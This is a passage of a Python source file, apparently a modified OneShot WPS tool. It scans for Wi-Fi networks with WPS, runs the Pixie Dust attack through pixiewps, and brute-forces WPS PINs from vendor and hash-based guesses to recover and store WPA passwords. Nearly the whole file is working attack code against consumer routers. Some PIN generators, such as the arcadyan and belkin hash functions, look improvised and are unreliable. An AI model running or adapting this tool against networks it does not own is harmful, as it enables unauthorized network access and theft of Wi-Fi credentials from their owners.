    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        if verbose is None:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            self.bssid = bssid.lower()
            print('[*] Selected AP: {}'.format(bssid))
        elif bssid and bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            self.lastPwr = signal

        return True

    def __runPixiewps(self, full_range=False):
        self.__print_with_indicators('*', 'Running Pixiewps…')
        base_cmd = self.pixie_creds.get_pixie_cmd(full_range)

        def _run(cmd):
            print(cmd)
            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=sys.stdout, encoding='utf-8', errors='replace')
            print(r.stdout)
            if r.returncode == 0:
                lines = r.stdout.splitlines()
                for line in lines:
                    if ('[+]' in line) and ('WPS pin' in line):
                        pin = line.split(':')[-1].strip()
                        if pin == '<empty>':
                            pin = "''"
                        return pin
            return None

        pin = _run(base_cmd)
        if pin:
            return pin
        for mode in range(1, 8):
            pin = _run(f"{base_cmd} --mode {mode}")
            if pin:
                return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] AP SSID: {essid}")
        print(f"[+] WPS PIN: {wps_pin}")
        print(f"[+] WPA PSK: {wpa_psk}")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = os.path.join(self.reports_dir, 'stored')
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        storage_id = bssid_storage_name(bssid)
        if not storage_id:
            return
        filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        display_bssid = canonical_bssid(bssid).upper() or bssid
        if len(pins) > 1:
            print(f'PINs generated for {display_bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = user_input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        target_bssid = canonical_bssid(bssid)
        self.bssid = target_bssid
        display_bssid = target_bssid.upper()
        if pbc_mode:
            if target_bssid:
                print(f"[*] Starting WPS push button connection to {display_bssid}…")
                cmd = f'WPS_PBC {target_bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN {pin}...")
            cmd = f'WPS_REG {target_bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            check_exit()
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=self.bssid)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        success = self.connection_status.status == 'GOT_PSK'
        self.sendOnly('WPS_CANCEL')
        return success

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False,
                          store_pin_on_fail=False):
        storage_id = bssid_storage_name(bssid)

        if pin is None:
            if pixiemode:
                try:
                    if not storage_id:
                        raise FileNotFoundError
                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if user_input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        else:
            self.__wps_connection(bssid, pin, pixiemode)
            bssid = self.connection_status.bssid or canonical_bssid(bssid)
            storage_id = bssid_storage_name(bssid)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                if storage_id:
                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
                    try:
                        os.remove(filename)
                    except FileNotFoundError:
                        pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(pixieforce)
                if pin:
                    while True:
                        if self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True):
                            return True
                        print('[!] Pixie Dust PIN failed, retrying connection…')
                        check_exit()
                        time.sleep(1)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

    def __print_with_indicators(self, level, msg):
        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))

    def cleanup(self):
        retsock = getattr(self, 'retsock', None)
        if retsock is not None:
            try:
                retsock.close()
            except OSError:
                pass

        wpas = getattr(self, 'wpas', None)
        if wpas is not None:
            try:
                wpas.terminate()
            except OSError:
                pass

        res_socket_file = getattr(self, 'res_socket_file', None)
        if res_socket_file:
            try:
                os.remove(res_socket_file)
            except FileNotFoundError:
                pass

        tempdir = getattr(self, 'tempdir', None)
        if tempdir:
            shutil.rmtree(tempdir, ignore_errors=True)

        tempconf = getattr(self, 'tempconf', None)
        if tempconf:
            try:
                os.remove(tempconf)
            except FileNotFoundError:
                pass

    def __del__(self):
        self.cleanup()

class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None, reverse=False):
        self.interface = interface
        self.vuln_list = vuln_list
        self.reverse = reverse

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        networks.sort(key=lambda x: x['Level'], reverse=True)

        network_list = {(i + 1): network for i, network in enumerate(networks)}

        def truncateStr(s, length, postfix="…"):
            """Truncate string to fit display width"""
            original_width = _str_width(s)
            if original_width <= length:
                return s + ' ' * (length - original_width)
            postfix_width = _str_width(postfix)
            max_allowed = length - postfix_width
            current_width = 0
            truncated = []
            for c in s:
                w = _str_width(c)
                if current_width + w > max_allowed:
                    break
                truncated.append(c)
                current_width += w
            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix
            result_width = _str_width(result)
            if result_width > length:
                current_width = 0
                safe = []
                for c in result:
                    w = _str_width(c)
                    if current_width + w > length:
                        break
                    safe.append(c)
                    current_width += w
                result = "".join(safe)
                if len(safe) < len(truncated) and _str_width(result + postfix) <= length:
                    result += postfix
            return result + ' ' * (length - _str_width(result))
        def colored(text, color=None):
            """Returns colored text"""
            palette = {
                'green': '\033[92m{}\033[00m',
                'red': '\033[91m{}\033[00m',
                'yellow': '\033[93m{}\033[00m'
            }
            return palette.get(color, '{}').format(text)

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', color='green'),
                colored('WPS locked', color='red'),
                colored('Algorithmic or known PINs', color='yellow')
            ))
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID (Signal)', 'WSC device name', 'WSC model'))

        network_list_items = list(network_list.items())
        if self.reverse:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            number = f'{n})'
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid_sig = f"{network.get('ESSID', 'HIDDEN')} ({network['Level']})"
            essid = truncateStr(essid_sig, 25)
            device_name = truncateStr(network['Device name'], 27)

            processed_number = truncateStr(number, 4)
            processed_bssid = truncateStr(network['BSSID'], 18)

            line = ' '.join([
                processed_number,
                processed_bssid,
                essid,
                device_name,
                model
            ])

            if network['WPS locked']:
                print(colored(line, color='red'))
            else:
                model_pins = generate_model_pins(mac=network['BSSID'], ssid=network.get('ESSID'), model=network['Model'], device=network['Device name'])
                suggested_pins = generate_suggested_pins(network['BSSID'])
                if model_pins or suggested_pins:
                    print(colored(line, color='yellow'))
                elif self.vuln_list and (model in self.vuln_list):
                    print(colored(line, color='green'))
                else:
                    print(line)

        return network_list

    def prompt_network(self) -> dict:
        os.system('clear')
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found')
            return
        while 1:
            try:
                networkNo = user_input('Select target (press Enter to refresh): ')
                if networkNo.lower() in ('r', '0', ''):
                    return self.prompt_network()
                elif int(networkNo) in networks.keys():
                    return networks[int(networkNo)]
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')

def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False

def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def arcadyan_pin(mac):
    mac_clean = re.sub(r'[^0-9A-Fa-f]', '', mac or '').upper()
    if len(mac_clean) != 12:
        return None
    h = hashlib.sha256((mac_clean + 'arcadyan').encode()).hexdigest()[:8]
    try:
        num = int(h, 16) % 10000000
        pin7 = f"{num:07d}"
        return pin7 + str(WPSpin.checksum(int(pin7)))
    except Exception:
        return None


def belkin_pin(mac):
    mac_clean = re.sub(r'[^0-9A-Fa-f]', '', mac or '').upper()
    if len(mac_clean) != 12:
        return None
    try:
        nic = int(mac_clean[-6:], 16)
        num = (nic + 1379) % 10000000
        pin7 = f"{num:07d}"
        return pin7 + str(WPSpin.checksum(int(pin7)))
    except Exception:
        return None


def _order_unique_pins(pins):
    """Remove duplicates while preserving order and keep only valid 8-digit pins"""
    seen = set()
    ordered = []
    for p in pins:
        if p == "" or (p.isdigit() and len(p) == 8):
            if p not in seen:
                seen.add(p)
                ordered.append(p)
    return ordered


MODEL_ALGO_HINTS = [
    ("ASUS", "pinASUS"),
    ("DIR", "pinDLink"),
    ("D-LINK", "pinDLink"),
    ("HG532", "pinHG532x"),
    ("H108L", "pinH108L"),
    ("THOMSON", "pinThomson"),
    ("REALTEK", "pinRealtek1"),
    ("RTL", "pinRealtek2"),
    ("BROADCOM", "pinBrcm1"),
    ("UR-814AC", "pinUR814AC"),
    ("UR-825AC", "pinUR825AC"),
    ("UPVEL", "pinUpvel"),
    ("EDIMAX", "pinEdimax"),
    ("ONLIME", "pinOnlime"),
    ("AIROCON", "pinAirocon"),
    ("CISCO", "pinCisco"),
]


def generate_model_pins(mac=None, ssid=None, model="", device=""):
    """Generate pins based on explicit router model information"""
    gen = WPSpin()
    model_upper = (model or "").upper()
    device_upper = (device or "").upper()
    hint_blob = f"{model_upper} {device_upper} {ssid.upper() if ssid else ''}"
    pins = []
    for sig, algo in MODEL_ALGO_HINTS:
        if sig in hint_blob:
            try:
                pins.append(gen.generate(algo, mac))
            except Exception:
                pass
    return _order_unique_pins(pins)


def generate_suggested_pins(mac):
    """Generate vendor related pins using MAC address suggestions"""
    gen = WPSpin()
    pins = []
    try:
        for item in gen.getSuggested(mac):
            pins.append(item['pin'])
    except Exception:
        pass
    return _order_unique_pins(pins)

def generate_pins(mac=None, ssid=None, serial=None):
    pins = []

    gen = WPSpin()
    for algo in gen.algos:
        try:
            pins.append(gen.generate(algo, mac))
        except Exception:
            pass

    def _hash_to_pin(hval: str) -> str:
        try:
            num = int(hval, 16) % 10000000
            pin7 = f"{num:07d}"
            return pin7 + str(WPSpin.checksum(int(pin7)))
        except Exception:
            return None

    mac_clean = re.sub(r'[^0-9A-Fa-f]', '', mac or '').upper()
    if len(mac_clean) == 12:
        try:
            val = int(mac_clean[-6:], 16)
            pin7 = f"{val % 10000000:07d}"
            pins.append(pin7 + str(WPSpin.checksum(int(pin7))))
        except Exception:
            pass
        pin = _hash_to_pin(hashlib.md5(mac_clean.encode()).hexdigest())
        if pin:
            pins.append(pin)

    if ssid:
        h = hashlib.sha1(ssid.encode()).hexdigest()
        for part in (h[:8], h[-8:]):
            pin = _hash_to_pin(part)
            if pin:
                pins.append(pin)

    if serial:
        h = hashlib.sha256(serial.encode()).hexdigest()
        for part in (h[:8], h[-8:]):
            pin = _hash_to_pin(part)
            if pin:
                pins.append(pin)

    return _order_unique_pins(pins)


def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
    for pin in pins:
        if pin in TRIED_PINS:
            continue
        TRIED_PINS.add(pin)
        if comp.single_connection(bssid, pin, pixiemode=pixie):
            return True
        if delay:
            time.sleep(delay)
    return False
def build_parser():
    parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
    parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
    parser.add_argument('--bssid', type=str, help='BSSID of the target AP')
    parser.add_argument(
        '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid and --pixie-dust)')
    parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
    parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
    parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
    parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
    parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true', help='Down network interface when the work is finished')
    parser.add_argument('--loop', action='store_true', help='Run in a loop')
    parser.add_argument('--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
    parser.add_argument('--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    return parser

def usage():
    return build_parser().format_help()

if __name__ == '__main__':
    parser = build_parser()
    args = parser.parse_args()

    if args.pin and (not args.bssid or not args.pixie_dust):
        parser.error('--pin can only be used together with --bssid and --pixie-dust')

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    force_loop = args.loop or args.push_button_connect

    while True:
        check_exit()
        companion = Companion(args.interface, args.write, print_debug=args.verbose)
        if args.push_button_connect:
            companion.single_connection(args.bssid, pbc_mode=True)
        else:
            essid = None
            network = None
            if not args.bssid:
                scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
                if not args.loop:
                    print('[*] BSSID not specified (--bssid) — scanning for available networks')
                network = scanner.prompt_network()
                if network:
                    args.bssid = network['BSSID']
                    essid = network.get('ESSID')
            if args.bssid:
                companion = Companion(args.interface, args.write, print_debug=args.verbose)
                if args.pin:
                    companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
                else:
                    model = network.get('Model', '') + network.get('Model number', '') if network else ''
                    device = network.get('Device name', '') if network else ''
                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
                        if args.pixie_dust:
                            print('[*] Trying Pixie Dust attack...')
                            companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
                        if companion.connection_status.status != 'GOT_PSK':
                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
                                if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
                                    pins = generate_pins(mac=args.bssid, ssid=essid)
                                    if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
                                                print('[-] All PIN attempts failed')
        if not force_loop:
            break
        if args.loop:
            args.bssid = None

    if args.iface_down:
        ifaceUp(args.interface, down=True)
